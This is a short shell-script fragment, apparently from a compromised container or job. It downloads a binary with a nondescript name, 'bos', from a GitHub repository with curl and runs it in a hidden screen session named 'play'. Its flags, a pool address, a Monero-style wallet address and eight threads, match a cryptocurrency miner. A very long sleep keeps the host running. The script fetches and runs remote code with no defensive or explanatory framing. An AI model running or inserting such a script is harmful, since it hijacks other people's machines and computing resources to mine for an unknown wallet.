...
curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
...
screen -dmS play ./bos -o 127.0.0.1:${TCP_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.NMS -t 8
sleep 34674653455
